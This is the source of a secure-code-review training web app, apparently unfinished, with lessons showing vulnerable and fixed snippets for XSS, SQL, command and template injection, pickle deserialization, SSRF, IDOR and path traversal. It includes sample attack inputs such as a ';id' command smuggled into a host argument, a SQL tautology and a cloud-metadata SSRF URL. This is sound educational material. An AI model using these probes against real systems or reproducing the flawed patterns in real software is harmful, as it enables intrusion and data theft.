<title>codeLearn</title>
<meta name="theme-color" content="#0D1015">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="apple-mobile-web-app-title" content="codeLearn">
<link rel="manifest" href="manifest.json">
<link rel="apple-touch-icon" href="icons/apple-touch-icon.png">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@600;700&family=IBM+Plex+Mono:wght@400;600&display=swap">
<style>
:root{
  --bg:#0D1015; --panel:#141A21; --panel2:#1B222C; --line:#28313D;
  --ink:#E9E6DE; --mut:#94A0AE; --amber:#F2A63B; --amber-dim:#8a5f22;
  --violet:#A18BFA; --good:#3FC98C; --bad:#E2594F;
  --kw:#7FB2F0; --str:#95CE84; --com:#5B6B7B; --num:#D89AF0; --vr:#EFA48B; --fn:#E8CE7A;
  --disp:'Chakra Petch',system-ui,sans-serif;
  --mono:'IBM Plex Mono',ui-monospace,SFMono-Regular,Menlo,monospace;
}
*{box-sizing:border-box}
html,body{height:100%}
body{
  margin:0; background:var(--bg); color:var(--ink);
  font:15px/1.55 -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  -webkit-tap-highlight-color:transparent; overscroll-behavior-y:contain;
}
button{font:inherit;color:inherit;background:none;border:none;padding:0;cursor:pointer}
.wrap{max-width:560px;margin:0 auto;padding:0 16px 104px}
/* ---------- app bar ---------- */
.appbar{
  position:sticky; top:env(safe-area-inset-top,0px); z-index:20;
  background:linear-gradient(180deg,var(--bg) 82%,rgba(13,16,21,0));
  padding:10px 0 12px;
}
.appbar .row{display:flex;align-items:center;gap:10px}
.logo{font-family:var(--disp);font-weight:700;font-size:19px;letter-spacing:.02em}
.logo em{font-style:normal;color:var(--amber)}
.logo .cursor{display:inline-block;width:9px;height:17px;background:var(--amber);margin-left:3px;vertical-align:-2px;animation:blink 1.2s steps(2) infinite}
@keyframes blink{50%{opacity:0}}
@media (prefers-reduced-motion:reduce){.logo .cursor{animation:none}}
.spacer{flex:1}
.streak{display:flex;align-items:center;gap:5px;font-family:var(--disp);font-weight:600;font-size:14px;color:var(--amber);background:var(--panel);border:1px solid var(--line);border-radius:999px;padding:4px 12px}
.streak.cold{color:var(--mut)}
.xpline{display:flex;align-items:center;gap:10px;margin-top:9px}
.rank{font-family:var(--disp);font-weight:600;font-size:12px;letter-spacing:.08em;text-transform:uppercase;color:var(--violet);white-space:nowrap}
.xpbar{flex:1;height:6px;border-radius:3px;background:var(--panel2);overflow:hidden}
.xpbar i{display:block;height:100%;border-radius:3px;background:linear-gradient(90deg,var(--violet),var(--amber));transition:width .5s ease}
.xpnum{font-family:var(--mono);font-size:11px;color:var(--mut);white-space:nowrap;font-variant-numeric:tabular-nums}
/* ---------- bottom nav ---------- */
.tabbar{
  position:fixed;left:0;right:0;bottom:0;z-index:30;
  background:rgba(20,26,33,.96);backdrop-filter:blur(10px);
  border-top:1px solid var(--line);
  padding:8px 8px calc(8px + env(safe-area-inset-bottom,0px));
}
.tabbar .inner{max-width:560px;margin:0 auto;display:flex}
.tab{flex:1;display:flex;flex-direction:column;align-items:center;gap:3px;color:var(--mut);font-family:var(--disp);font-size:11px;font-weight:600;letter-spacing:.05em;padding:4px 0;border-radius:10px}
.tab svg{width:22px;height:22px;stroke:currentColor;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
.tab.on{color:var(--amber)}
/* ---------- generic ---------- */
h1.pg{font-family:var(--disp);font-size:24px;font-weight:700;margin:14px 0 4px;text-wrap:balance}
.sub{color:var(--mut);margin:0 0 18px;max-width:46ch}
.sect{font-family:var(--disp);font-size:12px;font-weight:600;letter-spacing:.12em;text-transform:uppercase;color:var(--mut);margin:26px 0 10px}
.card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:16px;margin-bottom:12px}
.tap{display:block;width:100%;text-align:left;transition:transform .08s ease}
.tap:active{transform:scale(.985)}
.chip{display:inline-block;font-family:var(--mono);font-size:10.5px;padding:2px 8px;border-radius:999px;border:1px solid var(--line);color:var(--mut);background:var(--panel2)}
.chip.amber{color:var(--amber);border-color:var(--amber-dim)}
.chip.violet{color:var(--violet);border-color:#4a3f86}
.chip.good{color:var(--good);border-color:#1e5f44}
.chip.bad{color:var(--bad);border-color:#6e2b26}
.btn{
  display:block;width:100%;text-align:center;font-family:var(--disp);font-weight:700;font-size:15px;
  letter-spacing:.03em;background:var(--amber);color:#171208;border-radius:12px;padding:14px 18px;margin-top:14px;
}
.btn:active{transform:scale(.98)}
.btn.ghost{background:var(--panel2);color:var(--ink);border:1px solid var(--line)}
.btn.danger{background:none;border:1px solid #6e2b26;color:var(--bad)}
.btn[disabled]{opacity:.4;pointer-events:none}
.back{display:inline-flex;align-items:center;gap:6px;color:var(--mut);font-family:var(--disp);font-weight:600;font-size:13px;margin-top:12px}
.pbar{height:5px;border-radius:3px;background:var(--panel2);overflow:hidden}
.pbar i{display:block;height:100%;background:var(--amber);border-radius:3px;transition:width .4s}
.pbar.v i{background:var(--violet)}
/* ---------- track / lesson lists ---------- */
.trackcard{display:flex;align-items:center;gap:14px}
.tricon{
  width:44px;height:44px;border-radius:11px;flex:none;display:flex;align-items:center;justify-content:center;
  font-family:var(--mono);font-weight:600;font-size:13px;border:1px solid var(--line);background:var(--panel2);
}
.trmeta{flex:1;min-width:0}
.trname{font-family:var(--disp);font-weight:700;font-size:16px}
.trsub{font-size:12.5px;color:var(--mut);margin:1px 0 7px}
.count{font-family:var(--mono);font-size:11px;color:var(--mut);white-space:nowrap;font-variant-numeric:tabular-nums}
.lrow{display:flex;align-items:center;gap:12px}
.lstate{width:34px;height:34px;border-radius:50%;flex:none;display:flex;align-items:center;justify-content:center;border:1px solid var(--line);background:var(--panel2);font-family:var(--mono);font-size:12px;color:var(--mut)}
.lstate.done{background:#153526;border-color:#1e5f44;color:var(--good)}
.lstate.next{background:#33270f;border-color:var(--amber-dim);color:var(--amber)}
.lrow.locked{opacity:.45}
.lname{font-weight:600;font-size:14.5px}
.lxp{font-family:var(--mono);font-size:11px;color:var(--mut)}
/* ---------- code ---------- */
.codebox{
  background:#0A0D12;border:1px solid var(--line);border-radius:10px;
  margin:12px 0 4px;overflow-x:auto;
}
.codebox pre{margin:0;padding:12px 14px;font:12.5px/1.65 var(--mono);white-space:pre;min-width:min-content}
.codebox .lang{display:block;font:10px/1 var(--mono);color:var(--com);padding:8px 14px 0;letter-spacing:.1em;text-transform:uppercase}
.tk-kw{color:var(--kw)} .tk-str{color:var(--str)} .tk-com{color:var(--com)}
.tk-num{color:var(--num)} .tk-var{color:var(--vr)} .tk-fn{color:var(--fn)}
code.inl{font:12.5px var(--mono);background:var(--panel2);border:1px solid var(--line);border-radius:5px;padding:1px 5px;color:var(--amber)}
/* hunt code lines */
.hline{display:flex;width:100%;text-align:left;font:12.5px/1.7 var(--mono);white-space:pre;border-left:3px solid transparent}
.hline .no{flex:none;width:34px;padding-left:10px;color:#3d4856;user-select:none;font-variant-numeric:tabular-nums}
.hline .src{padding-right:14px}
.hline:active{background:#161d26}
.hline.hit{background:#15301f;border-left-color:var(--good)}
.hline.miss{background:#331a17;border-left-color:var(--bad)}
/* ---------- quiz ---------- */
.opt{
  display:block;width:100%;text-align:left;background:var(--panel);border:1px solid var(--line);
  border-radius:12px;padding:13px 14px;margin-bottom:10px;font-size:14px;
}
.opt .key{font-family:var(--mono);font-size:11px;color:var(--mut);margin-right:8px}
.opt.right{border-color:var(--good);background:#12291d}
.opt.wrong{border-color:var(--bad);background:#2c1714}
.opt.dim{opacity:.5}
.explain{border-left:3px solid var(--amber);background:var(--panel);border-radius:0 12px 12px 0;padding:12px 14px;font-size:13.5px;color:var(--ink);margin-top:4px}
.explain b{color:var(--amber)}
.qmeta{display:flex;align-items:center;gap:10px;margin:16px 0 10px}
.qmeta .pbar{flex:1}
.hearts{font-family:var(--mono);font-size:13px;color:var(--bad);letter-spacing:2px}
/* ---------- results / profile ---------- */
.bignum{font-family:var(--disp);font-weight:700;font-size:44px;color:var(--amber);line-height:1.1}
.center{text-align:center}
.resultcard{padding:28px 16px}
.badgegrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px}
.badge{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:12px}
.badge.off{opacity:.38}
.badge .bi{font-size:20px}
.badge .bn{font-family:var(--disp);font-weight:600;font-size:13px;margin:6px 0 2px}
.badge .bd{font-size:11.5px;color:var(--mut)}
.statrow{display:flex;gap:10px}
.stat{flex:1;background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:12px;text-align:center}
.stat .v{font-family:var(--disp);font-weight:700;font-size:22px;color:var(--amber)}
.stat .k{font-size:11px;color:var(--mut);letter-spacing:.05em;text-transform:uppercase}
/* toast */
#toast{
  position:fixed;left:50%;bottom:calc(84px + env(safe-area-inset-bottom,0px));transform:translateX(-50%) translateY(20px);
  background:var(--panel2);border:1px solid var(--amber-dim);color:var(--ink);
  font-family:var(--disp);font-weight:600;font-size:14px;border-radius:999px;padding:10px 20px;
  opacity:0;pointer-events:none;transition:all .3s ease;z-index:50;white-space:nowrap;max-width:92vw;
}
#toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
#updatebar{
  position:fixed;left:0;right:0;top:0;z-index:60;transform:translateY(-120%);transition:transform .35s ease;
  background:var(--amber);color:#171208;font-family:var(--disp);font-weight:700;font-size:13.5px;letter-spacing:.02em;
  text-align:center;padding:calc(11px + env(safe-area-inset-top,0px)) 16px 11px;cursor:pointer;
  box-shadow:0 6px 20px rgba(0,0,0,.4);
}
#updatebar.show{transform:translateY(0)}
#backupModal{position:fixed;inset:0;z-index:70;background:rgba(5,7,10,.72);display:flex;align-items:flex-end;justify-content:center}
#backupModal .sheet{width:100%;max-width:560px;background:var(--panel);border:1px solid var(--line);border-radius:18px 18px 0 0;padding:20px 16px calc(20px + env(safe-area-inset-bottom,0px));max-height:88vh;overflow-y:auto}
.sheettitle{font-family:var(--disp);font-weight:700;font-size:18px;margin-bottom:6px}
.backupta{width:100%;min-height:118px;background:#0A0D12;border:1px solid var(--line);border-radius:10px;color:var(--ink);font:12px/1.5 var(--mono);padding:10px;resize:vertical;-webkit-user-select:text;user-select:text}
.sheetbtns{display:flex;flex-wrap:wrap;gap:8px}
.sheetbtns .btn{flex:1;min-width:130px}
.refs{margin-top:14px;border:1px solid var(--line);border-radius:12px;padding:12px 14px;background:var(--panel)}
.refslabel{font-family:var(--disp);font-size:11px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--violet);margin-bottom:8px}
.reflink{display:flex;align-items:center;justify-content:space-between;gap:10px;text-decoration:none;color:var(--ink);font-size:13.5px;padding:9px 0;border-top:1px solid var(--line)}
.reflink:first-of-type{border-top:none}
.reflink .arw{color:var(--mut);font-size:14px;flex:none}
.reflink:active{color:var(--amber)}
.daily{border:1px solid var(--amber-dim);background:linear-gradient(160deg,#1d1608,var(--panel))}
.dailytag{font-family:var(--disp);font-size:11px;font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:var(--amber);margin-bottom:6px}
kbd,strong{color:var(--ink)}
p{margin:.5em 0}
</style>
</head>
<body>


<header class="appbar"><div class="wrap" style="padding-bottom:0">
  <div class="row">
    <div class="logo">code<em>Learn</em><span class="cursor"></span></div>
    <div class="spacer"></div>
    <div class="streak" id="streakpill">⚑ 0</div>
  </div>
  <div class="xpline">
    <span class="rank" id="rankname">Script Kiddie</span>
    <div class="xpbar"><i id="xpfill" style="width:0%"></i></div>
    <span class="xpnum" id="xpnum">0 XP</span>
  </div>
</div></header>

<main class="wrap" id="view"></main>

<nav class="tabbar"><div class="inner">
  <button class="tab" data-tab="learn" aria-label="Learn">
    <svg viewBox="0 0 24 24"><path d="M4 19V6a2 2 0 0 1 2-2h13v13H6a2 2 0 0 0-2 2zm0 0a2 2 0 0 0 2 2h13"/><path d="M9 8h6M9 11h4"/></svg>
    LEARN</button>
  <button class="tab" data-tab="hunt" aria-label="Hunt">
    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="7"/><path d="M12 2v4M12 18v4M2 12h4M18 12h4"/><circle cx="12" cy="12" r="1.2" fill="currentColor"/></svg>
    HUNT</button>
  <button class="tab" data-tab="profile" aria-label="Rank">
    <svg viewBox="0 0 24 24"><path d="M12 3l2.1 4.6 5 .6-3.7 3.4 1 4.9L12 14l-4.4 2.5 1-4.9L4.9 8.2l5-.6z"/></svg>
    RANK</button>
</div></nav>

<div id="updatebar" onclick="applyUpdate()">↻ New version available — tap to update</div>
<div id="toast"></div>
<div id="backupModal" hidden onclick="if(event.target===this)closeBackup()">
  <div class="sheet">
    <div class="sheettitle" id="backupTitle">Backup</div>
    <div class="lxp" id="backupDesc" style="margin-bottom:10px"></div>
    <textarea id="backupText" class="backupta" spellcheck="false" autocapitalize="off" autocomplete="off"></textarea>
    <div class="lxp" id="backupStatus" style="min-height:16px;margin:8px 0"></div>
    <input type="file" id="backupFile" accept="application/json,.json,.txt" hidden onchange="handleBackupFile(this)">
    <div class="sheetbtns">
      <button class="btn ghost" id="backupCopy" onclick="copyBackup()" style="margin:0">Copy code</button>
      <button class="btn ghost" id="backupDownload" onclick="downloadBackup()" style="margin:0">Download file</button>
      <button class="btn ghost" id="backupFileBtn" onclick="document.getElementById('backupFile').click()" style="margin:0">Load file</button>
      <button class="btn" id="backupRestore" onclick="restoreBackup()" style="margin:0">Restore</button>
    </div>
    <button class="btn ghost" onclick="closeBackup()" style="margin-top:10px">Close</button>
  </div>
</div>

<script>
'use strict';
/* =========================================================
   codeLearn — teach a pentester to read code & spot vulns
   ========================================================= */

/* ---------- tiny syntax highlighter ---------- */
const KW = {
  php:'php echo print include include_once require require_once if else elseif foreach as function return while for new class public private protected true false null die exit isset empty use namespace extends static global try catch switch case break',
  csharp:'using namespace class public private protected static void string int var bool return if else for foreach in new null true false async await try catch throw get set readonly interface override',
  cpp:'include define int char void return if else for while new delete sizeof struct class public private const unsigned long double float bool true false nullptr using namespace std size_t uint16_t uint32_t',
  js:'const let var function return if else for while new class this document window true false null undefined async await try catch import from export typeof require module',
  python:'def return if elif else for in while import from as class with try except raise True False None print lambda pass not and or is global del yield',
  java:'import public private protected class static final void String int long boolean var return if else for while do new null true false try catch finally throw throws this extends implements interface package abstract',
  sql:'select from where and or order by limit insert into values update set delete join inner left on union all as group having create table drop like'
};
function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function hl(src,lang){
  lang = lang||'js';
  const kws = (KW[lang]||KW.js).split(' ');
  const kwRe = kws.join('|');
  const flags = lang==='sql' ? 'gi' : 'g';
  const re = new RegExp(
    '(\\/\\*[\\s\\S]*?\\*\\/|\\/\\/[^\\n]*|#[^\\n]*|--[^\\n]*)'+   // 1 comment
    '|("(?:[^"\\\\\\n]|\\\\.)*"|\'(?:[^\'\\\\\\n]|\\\\.)*\')'+     // 2 string
    '|(\\$\\w+|@\\w+)'+                                            // 3 var/attr
    '|\\b(\\d[\\d._]*)\\b'+                                        // 4 number
    '|\\b('+kwRe+')\\b'+                                           // 5 keyword
    '|\\b(\\w+)(?=\\()'                                            // 6 fn call
  ,flags);
  return esc(src).replace(re,(m,com,str,vr,num,kw,fn)=>{
    if(com!==undefined){
      // '#include' in C++ is not a comment; '#' comments only for php/python
      if(com[0]==='#' && lang!=='php' && lang!=='python') return m;
      if(com.slice(0,2)==='--' && lang!=='sql') return m;
      if(com[0]==='#' && (lang==='php'||lang==='python')) return '<span class="tk-com">'+com+'</span>';
      if(com.slice(0,2)==='--' && lang==='sql') return '<span class="tk-com">'+com+'</span>';
      return '<span class="tk-com">'+com+'</span>';
    }
    if(str!==undefined) return '<span class="tk-str">'+str+'</span>';
    if(vr !==undefined) return '<span class="tk-var">'+vr+'</span>';
    if(num!==undefined) return '<span class="tk-num">'+num+'</span>';
    if(kw !==undefined) return '<span class="tk-kw">'+kw+'</span>';
    if(fn !==undefined) return '<span class="tk-fn">'+fn+'</span>';
    return m;
  });
}
function codebox(src,lang,label){
  return '<div class="codebox"><span class="lang">'+(label||lang)+'</span><pre>'+hl(src,lang)+'</pre></div>';
}

/* ---------- ranks & badges ---------- */
const RANKS = [
  [0,'Script Kiddie'],[120,'Recruit'],[300,'Code Reader'],[600,'Analyst'],
  [1000,'Bug Hunter'],[1500,'Exploit Dev'],[2200,'Red Teamer'],[3000,'APT Operator']
];
const BADGES = [
  {id:'first',  ic:'🩸', n:'First Blood',   d:'Complete your first lesson'},
  {id:'recon',  ic:'🔭', n:'Recon Done',    d:'Finish the Code Recon track'},  {id:'polyglot',ic:'🌐', n:'Polyglot',     d:'Finish a lesson in 3 languages'},
  {id:'eagle',  ic:'🎯', n:'Eagle Eye',    d:'Ace a code review with no misses'},
  {id:'five',   ic:'🔎', n:'Reviewer',     d:'Clear 5 review challenges'},
  {id:'allhunt',ic:'🏆', n:'Lead Auditor', d:'Clear every review challenge'},
  {id:'week',   ic:'⚑',  n:'Week Warrior', d:'Keep a 7-day streak'},
  {id:'grind',  ic:'⚡', n:'Grinder',      d:'Earn 1,000 XP'},
  {id:'scholar',ic:'🎓', n:'Scholar',      d:'Complete every lesson'},
  {id:'daily',  ic:'📅', n:'On Target',    d:'Clear a Daily Target challenge'}
];

/* ---------- version ---------- */
const APP_VERSION='1.3.0';

/* ---------- persistent state ---------- */
const KEY='codelearn.v1';
let S = {xp:0, done:{}, hunts:{}, streak:{last:'',n:0}, badges:{}, daily:''};
try{ const raw=localStorage.getItem(KEY); if(raw) S=Object.assign(S,JSON.parse(raw)); }catch(e){}
function save(){ try{ localStorage.setItem(KEY,JSON.stringify(S)); }catch(e){} }

function today(){ const d=new Date(); return d.getFullYear()+'-'+String(d.getMonth()+1).padStart(2,'0')+'-'+String(d.getDate()).padStart(2,'0'); }
function yesterday(){ const d=new Date(Date.now()-864e5); return d.getFullYear()+'-'+String(d.getMonth()+1).padStart(2,'0')+'-'+String(d.getDate()).padStart(2,'0'); }

function rankInfo(xp){
  let cur=RANKS[0], next=null;
  for(const r of RANKS){ if(xp>=r[0]) cur=r; else { next=r; break; } }
  return {name:cur[1], base:cur[0], next};
}
function addXP(n){
  const before=rankInfo(S.xp).name;
  S.xp+=n;
  const t=today();
  if(S.streak.last!==t){
    S.streak.n = (S.streak.last===yesterday()) ? S.streak.n+1 : 1;
    S.streak.last=t;
  }
  const after=rankInfo(S.xp).name;
  save(); renderHeader();
  if(after!==before) toast('▲ Rank up: '+after);
  checkBadges();
}
function grant(id){
  if(S.badges[id]) return;
  S.badges[id]=Date.now(); save();
  const b=BADGES.find(x=>x.id===id);
  if(b) setTimeout(()=>toast(b.ic+' Badge: '+b.n),700);
}
function checkBadges(){
  const doneIds=Object.keys(S.done);
  if(doneIds.length>0) grant('first');
  const langsDone=new Set();
  for(const t of TRACKS){
    const fin=t.lessons.filter(l=>S.done[l.id]).length;
    if(fin>0 && t.id!=='recon') langsDone.add(t.id);
    if(fin===t.lessons.length && t.id==='recon') grant('recon');
  }
  if(langsDone.size>=3) grant('polyglot');
  const solved=Object.values(S.hunts).filter(h=>h.solved);
  if(solved.length>=5) grant('five');
  if(solved.length===HUNTS.length) grant('allhunt');
  if(solved.some(h=>h.perfect)) grant('eagle');
  if(S.streak.n>=7) grant('week');
  if(S.xp>=1000) grant('grind');
  if(TRACKS.every(t=>t.lessons.every(l=>S.done[l.id]))) grant('scholar');
}

/* ---------- toast ---------- */
let toastT=null;
function toast(msg){
  const el=document.getElementById('toast');
  el.textContent=msg; el.classList.add('show');
  clearTimeout(toastT); toastT=setTimeout(()=>el.classList.remove('show'),2400);
}

/* ---------- header ---------- */
function renderHeader(){
  const r=rankInfo(S.xp);
  document.getElementById('rankname').textContent=r.name;
  document.getElementById('xpnum').textContent=S.xp+' XP';
  const span=r.next? (r.next[0]-r.base) : 1;
  const pct=r.next? Math.min(100,Math.round((S.xp-r.base)/span*100)) : 100;
  document.getElementById('xpfill').style.width=pct+'%';
  const sp=document.getElementById('streakpill');
  const active=(S.streak.last===today());
  sp.textContent='⚑ '+S.streak.n;
  sp.classList.toggle('cold',!active);
}

/* ---------- router ---------- */
let view={name:'learn'};
function go(v){ view=v; render(); window.scrollTo(0,0); }
function setTab(name){
  document.querySelectorAll('.tab').forEach(b=>b.classList.toggle('on',b.dataset.tab===name));
}
document.querySelectorAll('.tab').forEach(b=>{
  b.addEventListener('click',()=>go({name:b.dataset.tab}));
});

function render(){
  const root=document.getElementById('view');
  if(view.name==='learn'){ setTab('learn'); root.innerHTML=vHome(); }
  else if(view.name==='track'){ setTab('learn'); root.innerHTML=vTrack(view.trackId); }
  else if(view.name==='lesson'){ setTab('learn'); root.innerHTML=vLesson(); }
  else if(view.name==='hunt'){ setTab('hunt'); root.innerHTML=vHuntList(); }
  else if(view.name==='huntplay'){ setTab('hunt'); root.innerHTML=vHuntPlay(); }
  else if(view.name==='profile'){ setTab('profile'); root.innerHTML=vProfile(); }
  bindView(root);
}
/* delegate clicks via data-act attributes */
function bindView(root){
  root.querySelectorAll('[data-act]').forEach(el=>{
    el.addEventListener('click',()=>handleAct(el));
  });
}

     {t:'read',lang:'python',label:'Flask — a request handler',code:'from flask import request\n\n@app.route("/hello")\ndef hello():\n    name = request.args.get("name")     # SOURCE: from ?name=\n    return "<h1>Hi " + name + "</h1>"    # SINK: reflected into HTML',note:'Input from <code class="inl">request.args</code> is concatenated into HTML and returned — reflected <b>XSS</b> unless escaped. Jinja templates auto-escape; raw string building like this does not.'},
     {t:'quiz',q:'In this Python web handler, which line is the untrusted <b>source</b>?',
      opts:['The <code class="inl">@app.route</code> decorator','<code class="inl">request.args.get("name")</code>','The string <code class="inl">"Hi "</code>','The function name <code class="inl">hello</code>'],a:1,
      why:'<b>request.args</b> reads the URL query string — fully attacker-controlled. The decorator and function name are structure, not data.'}
   ]},
   {id:'py2', name:'SQL injection in Python', xp:30, cards:[
     {t:'md',html:'<p>Every Python database driver (sqlite3, psycopg2, MySQLdb, SQLAlchemy Core) accepts <b>parameters</b>. The bug appears when code builds the query string itself with an <b>f-string</b>, <code class="inl">%</code>, <code class="inl">.format()</code>, or <code class="inl">+</code>.</p>'},
     {t:'read',lang:'python',label:'Vulnerable',code:'name = request.args.get("name")\ncur.execute(f"SELECT * FROM users WHERE name = \'{name}\'")',note:'The f-string drops <code class="inl">name</code> straight into the SQL text — <code class="inl">?name=\' OR \'1\'=\'1</code> returns every row. f-strings and <code class="inl">.format()</code> are SQL injection in disguise.'},
     {t:'read',lang:'python',label:'Safe — parameterized',code:'cur.execute("SELECT * FROM users WHERE name = %s", (name,))',note:'The <code class="inl">%s</code> here is a <b>driver placeholder</b>, not string formatting — the value is bound separately and can never alter the query. (sqlite3 uses <code class="inl">?</code>.)'},
     {t:'quiz',q:'Which call is <b>safe</b> from SQL injection?',
      opts:['<code class="inl">cur.execute(f"...WHERE id={uid}")</code>','<code class="inl">cur.execute("...WHERE id=%s", (uid,))</code>','<code class="inl">cur.execute("...WHERE id=" + uid)</code>','<code class="inl">cur.execute("...WHERE id={}".format(uid))</code>'],a:1,
      why:'Only the <b>parameterized</b> call keeps the value as data. f-strings, <code class="inl">+</code>, and <code class="inl">.format()</code> all build the query from raw input.'}
   ]},
   {id:'py3', name:'Command injection in Python', xp:30, cards:[
     {t:'md',html:'<p>Python reaches the OS shell through <code class="inl">os.system()</code>, <code class="inl">os.popen()</code>, and <code class="inl">subprocess</code> calls with <code class="inl">shell=True</code>. The danger sign is a <b>built command string</b> handed to any of these.</p>'},
     {t:'read',lang:'python',label:'Vulnerable',code:'import subprocess\nhost = request.args.get("host")\nsubprocess.run("ping -c1 " + host, shell=True)   # ?host=8.8.8.8;id',note:'<code class="inl">shell=True</code> runs the string in <code class="inl">/bin/sh</code>, so <code class="inl">;</code> <code class="inl">|</code> <code class="inl">$()</code> chain attacker commands.'},
     {t:'read',lang:'python',label:'Safe — argument list',code:'subprocess.run(["ping", "-c1", host])   # list form, no shell',note:'An <b>argument list</b> with no <code class="inl">shell=True</code> sends <code class="inl">host</code> as a single argument to ping — the shell never parses it.'},
     {t:'quiz',q:'What single detail makes <code class="inl">subprocess.run(cmd, shell=True)</code> dangerous?',
      opts:['It imports subprocess','<code class="inl">shell=True</code> runs the built string through a shell that interprets metacharacters','run() is deprecated','It returns output'],a:1,
      why:'<b>shell=True</b> plus a concatenated string is command injection. The list form with no shell is the safe pattern.'}
   ]},
   {id:'py4', name:'Server-Side Template Injection', xp:35, cards:[
     {t:'md',html:'<p>Template engines (Jinja2, Twig, Freemarker) evaluate expressions inside markers like <code class="inl">{{ }}</code>. If <b>user input is placed into the template itself</b> — not just passed as a value — the input is evaluated as template code, often leading to RCE. The Python tell is <code class="inl">render_template_string()</code> built from input.</p>'},
     {t:'read',lang:'python',label:'Vulnerable',code:'from flask import render_template_string, request\nname = request.args.get("name")\ntpl = "<h1>Hello " + name + "</h1>"\nreturn render_template_string(tpl)   # ?name={{7*7}} -> 49',note:'Because <code class="inl">name</code> is concatenated into the <i>template source</i>, <code class="inl">{{7*7}}</code> renders as <code class="inl">49</code> — proof of <b>SSTI</b>. Payloads escalate to reading files and running commands.'},
     {t:'read',lang:'python',label:'Safe — fixed template, bound value',code:'return render_template_string("<h1>Hello {{ name }}</h1>", name=name)',note:'The template is <b>fixed</b> and <code class="inl">name</code> is passed as a bound variable — escaped, never evaluated as template code.'},
     {t:'quiz',q:'In a Flask app, <code class="inl">?name={{7*7}}</code> shows <code class="inl">49</code> on the page. What does that prove?',
      opts:['A math bug','Server-Side Template Injection — input is evaluated as template code','A caching issue','Nothing, that is normal'],a:1,
      why:'User input being <b>evaluated</b> (7*7 → 49) means it reached the template engine as code. That is <b>SSTI</b>, a common path to RCE.'}
   ]},
   {id:'py5', name:'Insecure deserialization (pickle)', xp:35, cards:[
     {t:'md',html:'<p>Python\'s <code class="inl">pickle</code> can serialize almost any object — and <b>deserializing</b> attacker-controlled pickle data can execute code, because a pickle stream can invoke arbitrary constructors. The same risk applies to <code class="inl">yaml.load()</code> with an unsafe loader.</p>'},
     {t:'read',lang:'python',label:'Dangerous',code:'import pickle\ndata = request.get_data()          # untrusted bytes\nobj = pickle.loads(data)           # RCE: pickle can run code on load',note:'Never <code class="inl">pickle.loads()</code> untrusted input — a crafted pickle can run commands as your app. Use JSON, or <code class="inl">yaml.safe_load()</code> for YAML.'},
     {t:'quiz',q:'You see <code class="inl">pickle.loads(request.get_data())</code>. Verdict?',
      opts:['Fine — pickle is just serialization','Critical — deserializing untrusted pickle can execute code (RCE)','Only a problem if the object is large','Safe if wrapped in try/except'],a:1,
      why:'<b>pickle.loads</b> on attacker data is a textbook RCE. The fix is a safe format (JSON) or <code class="inl">yaml.safe_load</code>; try/except does not help.'}
   ]}
  ]
 },
 {
  id:'webpat', name:'Web Attack Patterns', tag:'CROSS-LANG', icon:'◎', accent:'amber',
  sub:'Language-agnostic bug classes scanners and beginners miss.',
  lessons:[
   {id:'w1', name:'SSRF — Server-Side Request Forgery', xp:35, cards:[
     {t:'md',html:'<p><b>Server-Side Request Forgery (SSRF)</b>: the server fetches a URL the user controls. An attacker points it at <b>internal</b> systems the server can reach but they cannot — admin panels, databases, or the cloud <b>metadata endpoint</b> <code class="inl">169.254.169.254</code>, which can hand back credentials.</p><p>The tell: a request function (<code class="inl">requests.get</code>, <code class="inl">fetch</code>, <code class="inl">curl</code>, <code class="inl">file_get_contents</code>) fed a user-supplied URL.</p>'},
     {t:'read',lang:'python',label:'Vulnerable',code:'url = request.args.get("url")     # user controls the whole URL\nr = requests.get(url)             # server fetches it\nreturn r.text                     # ...and returns the response',note:'<code class="inl">?url=http://169.254.169.254/latest/meta-data/</code> makes the server read cloud metadata. Defenses: allowlist hosts, block internal IP ranges, disable redirects.'},
     {t:'quiz',q:'Why is fetching a user-supplied URL server-side dangerous, even though the user could visit URLs themselves?',
      opts:['It is slow','The server can reach internal-only systems (metadata, admin panels) the user cannot','It wastes bandwidth','It is not dangerous'],a:1,
      why:'SSRF abuses the <b>server\'s</b> network position to reach internal resources — the classic prize is cloud <b>metadata</b> credentials.'}
   ]},
   {id:'w2', name:'IDOR & broken access control', xp:35, cards:[
     {t:'md',html:'<p><b>Insecure Direct Object Reference (IDOR)</b>: code looks up a record by an id from the request but never checks that the record <b>belongs to</b> the current user. Change the id, read someone else\'s data.</p><p>This is invisible to input-sanitization thinking — the input is a perfectly valid number. You find it by asking: <i>where is the ownership check?</i></p>'},
     {t:'read',lang:'python',label:'Vulnerable',code:'@app.route("/invoice/<id>")\ndef invoice(id):\n    inv = db.invoices.get(id)      # fetched by id from the URL\n    return render(inv)             # no check that inv.owner == current_user',note:'<code class="inl">/invoice/1001</code> → <code class="inl">/invoice/1002</code> exposes another customer\'s invoice. The fix is an <b>authorization check</b>: confirm the object belongs to the caller.'},
     {t:'quiz',q:'A handler loads <code class="inl">invoice[id]</code> straight from the URL id. What control is missing?',
      opts:['Input validation on the number','An authorization check that the invoice belongs to the current user','Rate limiting','HTTPS'],a:1,
      why:'The id is valid data; the flaw is <b>broken access control</b>. Every object fetched by a client-supplied id needs an ownership/permission check.'}
   ]},
   {id:'w3', name:'Path traversal & file inclusion', xp:30, cards:[
     {t:'md',html:'<p><b>Path traversal</b>: a filename from the user is joined to a path and used to read, write, or include files. Sequences like <code class="inl">../</code> climb out of the intended directory to reach <code class="inl">/etc/passwd</code>, source, or config.</p><p>Cross-language sinks: <code class="inl">open()</code>, <code class="inl">readFile</code>, <code class="inl">include</code>, <code class="inl">File.ReadAllText</code>, <code class="inl">fopen</code>.</p>'},
